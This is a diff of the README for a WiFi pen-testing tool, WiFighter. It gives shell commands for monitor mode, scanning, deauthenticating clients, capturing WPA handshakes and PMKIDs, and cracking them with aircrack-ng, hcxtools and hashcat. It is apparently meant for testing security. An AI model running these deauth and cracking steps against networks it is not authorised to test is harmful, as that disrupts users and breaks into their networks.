@@ -5,7 +5,7 @@ Easy-to-use WiFI pen-testing/scanning tool written in python
 ## Installation 
 
 **Dependencies**
-```c
+```sh
 sudo zypper in python3 aircrack-ng hashcat ...
 
 ```
@@ -14,37 +14,37 @@ sudo zypper in python3 aircrack-ng hashcat ...
 **Creating python virtual enviroment**
 
 Clone the project
-```c
+```sh
 git clone https://github.com/FilipStruhar/WiFighter.git
 ```
 
 Enter the project folder
-```c
+```sh
 cd WiFighter
 ```
 
 Create virtual enviroment
-```c
+```sh
 python3 -m venv venv
 ```
 
 Enter the virtual enviroment
-```c
+```sh
 source venv/bin/activate
 ```
 
 Install python modules (prettytable, psutil, scapy) 
-```c
+```sh
 pip3 install -r requirements.txt
 ```
 
 Exit from virtual enviroment
-```c
+```sh
 deactivate
 ```
 
 Run the tool
-```c
+```sh
 sudo ./wifighter.py
 ```
 
@@ -54,8 +54,9 @@ sudo ./wifighter.py
 
 ## Attacking
 - wps cracking (testing)
-- reports in csv
-- monitor start --interfaces-- listen --channel-- command
+- PMKID cracking (testing)
+- monitor start --interfaces-- listen --channel--
+
 
 ## Future visions
 - mazat prazdne/nechycene handshaky z attacks
@@ -65,6 +66,7 @@ sudo ./wifighter.py
 ## REMEMBER !!
 - create requirements.txt
 - add time.sleep after monitor switch before attacking
+
 - dependencies a install script
 
 
@@ -78,89 +80,117 @@ sudo ./wifighter.py
 **Monitor mode**
 
 Set interface to monitor
-```c
+```sh
 sudo airmon-ng start <INTERFACE>
 ```
 
 Set interface to managed
-```c
+```sh
 sudo airmon-ng stop <INTERFACE>mon
 ```
 
 **Scan nearby WiFi's**
 
 Scan all
-```c
+```sh
 sudo airodump-ng <INTERFACE>mon
 ```
 
 Scan 2.4GHz WiFi's
-```c
+```sh
 sudo airodump-ng --band gb <ESSID> <INTERFACE>mon
 ```
 
 Scan 5GHz WiFi's
-```c
+```sh
 sudo airodump-ng --band a <ESSID> <INTERFACE>mon
 ```
 
 **Capture handshake**
 
 Listen for handshake of specified AP
-```c
+```sh
 sudo airodump-ng -c <CHANNEL> --bssid <BSSID> -w <OUTPUT_FILE> <INTERFACE>mon
 ```
 
 **Deauth clients (force handshake)**
 
 Deauth all (broadcast)
-```c
+```sh
 sudo aireplay-ng -0 1 -a <BSSID> <INTERFACE>mon
 ```
 
 Deauth client
-```c
+```sh
 sudo aireplay-ng -0 1 -a <BSSID> -c <CLIENT_MAC> <INTERFACE>mon
 ```
 
 Verify captured handshake
-```c
+```sh
 sudo aircrack-ng <HANDSHAKE>.cap 
 ```
 
 **Crack handshake - aircrack**
 
-```c
+```sh
 sudo aircrack-ng -w <WORDLIST> -b <TARGET_AP_MAC> <HANDSHAKE>.cap
 ```
 
-**Crack handshake - hashcat**
 
-Convert captured handshake to hashcat format
-```c
-sudo aircrack-ng -J <OUTPUTFILE> <HANDSHAKE>.cap  
+### WPS Attack - Reaver
+Dependencies
+```sh
+sudo zypper in aircrack-ng
 ```
-
-Crack with wordlist
-```c
-sudo hashcat -m 22000 <HANDSHAKE>.hccap <WORDLIST>
+```sh
+pixiewps - GitHub
 ```
+```sh
+libpcap - Repo
+```
+Installation
 
 
-### 2. PMKID Attack (802.11r exploit)
-
-**Hcxtools guide - TESTOVAT U TATY, TP-Link OneMesh feature**
-
-- PMKID Capture
-- Converting raw .pcapng captures to hashcat readable formats
-
-**Installation**
-
-```c
+### PMKID Attack
+Compile needed hcxtools & install it's dependencies
+```sh
 git clone https://github.com/ZerBea/hcxtools.git
 cd hcxtools
+
+sudo zypper in *gcc *libopenssl3 libopenssl-devel *libz1 *libz-devel *libcurl4 libcurl-devel *pkgconf-pkg-config
+
+sudo make install
+
+
+git clone https://github.com/ZerBea/hcxdumptool.git  # Install version 6.2.6
+cd hcxdumptool
+
+sudo make install
+```
+
+Install and setup hashcat
+```sh
+sudo zypper in hashcat pocl
 ```
 
 
+Put wireless NIC into monitor
+```sh
+wifighter start <INTERFACE>
+```
 
+Capture PMKID
+```sh
+sudo hcxdumptool -o <OUTPUT_CAPTURE_FILE> -i <INTERFACE> --enable_status=3 --filtermode=2 --filterlist_ap=<TARGET_AP_LIST>
+```
+
+Convert capture into the hash format
+```sh
+hcxpcapngtool -o <OUTPUT_PMKID_HASH_FILE> <CAPTURED_PMKID>
+```
+
+Crack the PMKID
+```sh
+sudo hashcat -D 1 -a 0 -m 22000 <PMKID_HASH_FILE> <WORDLIST> -o <OUTPUT_FILE>
+```
 
